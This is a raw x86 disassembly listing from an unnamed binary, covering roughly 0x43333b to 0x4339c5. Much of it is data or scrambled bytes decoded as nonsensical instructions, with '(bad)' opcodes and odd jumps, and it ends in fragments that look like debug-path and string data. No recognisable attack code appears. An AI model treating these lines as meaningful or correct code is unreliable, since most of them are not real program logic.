  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	fst    QWORD PTR [edi+0x63]
  433990:	mov    dh,0xb8
  433992:	jbe    0x433928
  433994:	inc    eax
  433995:	lods   al,BYTE PTR ds:[esi]
  433996:	ja     0x43392f
  433998:	dec    ebx
  433999:	pop    edi
  43399a:	int3   
  43399b:	sub    dl,bh
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
